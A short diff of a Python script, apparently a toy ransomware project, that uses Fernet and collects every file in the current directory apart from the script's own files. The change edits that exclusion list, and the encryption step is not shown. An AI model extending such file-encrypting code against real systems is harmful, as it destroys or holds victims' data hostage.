@@ -1,9 +1,9 @@
-import os
+import os 
 from cryptography.fernet import Fernet
 
 files=[]
 for file in os.listdir():
-    if file == "mal_encrypt.py" or file == "mal_decrypt.py" or file == "thekey.key" or file == "calc.py" or file == "mware.py" or file=="de_en.txt":
+    if file == "mal_encrypt.py" or file == "mal_decrypt.py" or file == "thekey.key" or file == "calc.py"  or file=="LICENSE":
         continue
     if os.path.isfile(file):
         files.append(file)
